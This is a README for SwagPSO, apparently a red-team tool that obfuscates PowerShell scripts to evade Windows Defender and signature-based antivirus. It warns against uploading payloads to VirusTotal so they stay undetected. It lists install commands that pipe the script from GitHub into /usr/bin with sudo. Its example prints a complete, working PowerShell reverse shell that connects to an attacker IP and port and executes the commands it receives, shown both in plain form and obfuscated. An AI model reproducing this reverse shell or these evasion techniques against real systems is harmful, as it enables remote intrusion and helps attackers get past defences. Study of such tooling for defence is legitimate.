#### NOTE: DO NOT test your payloads by uploading to virustotal or similar services unless you want them to be finger printed and become ineffective.
# Swag PSO
swag powershell obfuscator

## Install
using wget
```bash
sudo bash -c "wget https://raw.githubusercontent.com/1337Rin/Swag-PSO/main/swagpso.sh -O /usr/bin/swagpso && chmod 755 /usr/bin/swagpso"
```
using curl
```bash
sudo bash -c "curl https://raw.githubusercontent.com/1337Rin/Swag-PSO/main/swagpso.sh > /usr/bin/swagpso && chmod 755 /usr/bin/swagpso"
```

## Description
SwagPSO is a simple shell script to help obfuscate powershell scripts in order to bypass Windows Defender and other signature based AV. SwagPSO only focuses on automating obfuscation techniques that would be tedious to do by hand and therefore should not be the only tool used in the obfuscation process. Additionally it may break programs depending on their complexity and is thus better suited for simple scripts. It currently supports 7 tecniques.
* renaming functions
* renaming variables
* renaming cmdlets
* randomizing capatalization
* adding junk comments
* replacing "\n" with ;
* removing unessesary spaces

## Example
```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ ./swagpso.sh -s rev.ps1 -v coolvariable -f nicefunction
  ______  __       __  ______   ______       _______   ______   ______  
 /      \|  \  _  |  \/      \ /      \     |       \ /      \ /      \
|  ▓▓▓▓▓▓\ ▓▓ / \ | ▓▓  ▓▓▓▓▓▓\  ▓▓▓▓▓▓\    | ▓▓▓▓▓▓▓\  ▓▓▓▓▓▓\  ▓▓▓▓▓▓\
| ▓▓___\▓▓ ▓▓/  ▓\| ▓▓ ▓▓__| ▓▓ ▓▓ __\▓▓    | ▓▓__/ ▓▓ ▓▓___\▓▓ ▓▓  | ▓▓
 \▓▓    \| ▓▓  ▓▓▓\ ▓▓ ▓▓    ▓▓ ▓▓|    \    | ▓▓    ▓▓\▓▓    \| ▓▓  | ▓▓
 _\▓▓▓▓▓▓\ ▓▓ ▓▓\▓▓\▓▓ ▓▓▓▓▓▓▓▓ ▓▓ \▓▓▓▓    | ▓▓▓▓▓▓▓ _\▓▓▓▓▓▓\ ▓▓  | ▓▓
|  \__| ▓▓ ▓▓▓▓  \▓▓▓▓ ▓▓  | ▓▓ ▓▓__| ▓▓    | ▓▓     |  \__| ▓▓ ▓▓__/ ▓▓
 \▓▓    ▓▓ ▓▓▓    \▓▓▓ ▓▓  | ▓▓\▓▓    ▓▓    | ▓▓      \▓▓    ▓▓\▓▓    ▓▓
  \▓▓▓▓▓▓ \▓▓      \▓▓\▓▓   \▓▓ \▓▓▓▓▓▓      \▓▓       \▓▓▓▓▓▓  \▓▓▓▓▓▓ 
                                                                        
By: 1337Rin
github: https://github.com/1337Rin/Swag-PSO

[-] original_rev.ps1 already exists

[+] creating copy
[+] rev.ps1 --> original_rev.ps11

[-] no functions found

[+] renaming variables
[+] $buffer --> $coolvariablexGRYSRy29xK0WBo5Q7zx
[+] $encoding --> $coolvariableg2wCBRTzRsXDMgzLqW69
[+] $null --> $coolvariableaEBK1zFFe5A1lCezd6he
[+] $out --> $coolvariableVzLv47EBrwFfIA75Zzep
[+] $read --> $coolvariableJQobgKI01nxko3qIv0q3
[+] $res --> $coolvariablefJv19MiNqgf6z6Kp2rW5
[+] $socket --> $coolvariableWeLGwQewmAISzZu8oClW
[+] $stream --> $coolvariableH1QUvksSTFmrHWnl5kDj
[+] $writer --> $coolvariablelUPojbcD1onBPdkrHvmE

[+] creating junk commets
[+] ; --> ;<#tjyqhyohhh#>

[+] searching for commands
[+] found New-Object
[+] making alias New-Object --> vwfqdqybfvmswwy

[+] restructuring script

[+] getting rid of spaces around equal sign
```
rev.ps1
```powershell
$socket = new-object System.Net.Sockets.TcpClient("<IP>",<PORT>);
if($socket -eq $null){exit 1}
$stream = $socket.GetStream();
$writer = new-object System.IO.StreamWriter($stream);
$buffer = new-object System.Byte[] 1024;
$encoding = new-object System.Text.AsciiEncoding;
do{
    $writer.Write("[new]> ");
    $writer.Flush();
    $read = $null;
    while($stream.DataAvailable -or ($read = $stream.Read($buffer, 0, 1024)) -eq $null){}
    $out = $encoding.GetString($buffer, 0, $read).Replace("rn","").Replace("`n","");
    if(!$out.equals("exit")){
        $out = $out.split()
            $res = [string](&$out[0] $out[1..$out.length]);
        if($res -ne $null){ $writer.WriteLine($res)}
    }
}While (!$out.equals("exit"))
$writer.close();$socket.close();
```
would become...
```powershell
Set-Alias -Name vwfqdqybfvmswwy -Value New-Object;;$coolvariableWeLGwQewmAISzZu8oClW=vwfqdqybfvmswwy System.Net.Sockets.TcpClient("<IP>",<PORT>);<#tjyqhyohhh#>;if($coolvariableWeLGwQewmAISzZu8oClW -eq $coolvariableaEBK1zFFe5A1lCezd6he){exit 1};$coolvariableH1QUvksSTFmrHWnl5kDj=$coolvariableWeLGwQewmAISzZu8oClW.GetStream();<#tjyqhyohhh#>;$coolvariablelUPojbcD1onBPdkrHvmE=vwfqdqybfvmswwy System.IO.StreamWriter($coolvariableH1QUvksSTFmrHWnl5kDj);<#tjyqhyohhh#>;$coolvariablexGRYSRy29xK0WBo5Q7zx=vwfqdqybfvmswwy System.Byte[] 1024;<#tjyqhyohhh#>;$coolvariableg2wCBRTzRsXDMgzLqW69=vwfqdqybfvmswwy System.Text.AsciiEncoding;<#tjyqhyohhh#>;do{; $coolvariablelUPojbcD1onBPdkrHvmE.Write("[new]> ");<#tjyqhyohhh#>; $coolvariablelUPojbcD1onBPdkrHvmE.Flush();<#tjyqhyohhh#>; $coolvariableJQobgKI01nxko3qIv0q3=$coolvariableaEBK1zFFe5A1lCezd6he;<#tjyqhyohhh#>; while($coolvariableH1QUvksSTFmrHWnl5kDj.DataAvailable -or ($coolvariableJQobgKI01nxko3qIv0q3=$coolvariableH1QUvksSTFmrHWnl5kDj.Read($coolvariablexGRYSRy29xK0WBo5Q7zx, 0, 1024)) -eq $coolvariableaEBK1zFFe5A1lCezd6he){}; $coolvariableVzLv47EBrwFfIA75Zzep=$coolvariableg2wCBRTzRsXDMgzLqW69.GetString($coolvariablexGRYSRy29xK0WBo5Q7zx, 0, $coolvariableJQobgKI01nxko3qIv0q3).Replace("rn","").Replace("`n","");<#tjyqhyohhh#>; if(!$coolvariableVzLv47EBrwFfIA75Zzep.equals("exit")){; $coolvariableVzLv47EBrwFfIA75Zzep=$coolvariableVzLv47EBrwFfIA75Zzep.split(); $coolvariablefJv19MiNqgf6z6Kp2rW5=[string](&$coolvariableVzLv47EBrwFfIA75Zzep[0] $coolvariableVzLv47EBrwFfIA75Zzep[1..$coolvariableVzLv47EBrwFfIA75Zzep.length]);<#tjyqhyohhh#>; if($coolvariablefJv19MiNqgf6z6Kp2rW5 -ne $coolvariableaEBK1zFFe5A1lCezd6he){ $coolvariablelUPojbcD1onBPdkrHvmE.WriteLine($coolvariablefJv19MiNqgf6z6Kp2rW5)}; };}While (!$coolvariableVzLv47EBrwFfIA75Zzep.equals("exit"));$coolvariablelUPojbcD1onBPdkrHvmE.close();<#tjyqhyohhh#>$coolvariableWeLGwQewmAISzZu8oClW.close();<#tjyqhyohhh#>;
```

## Credits
- [Tristram](https://github.com/gh0x0st) Big thanks for helping to implement cmdlet parsing.
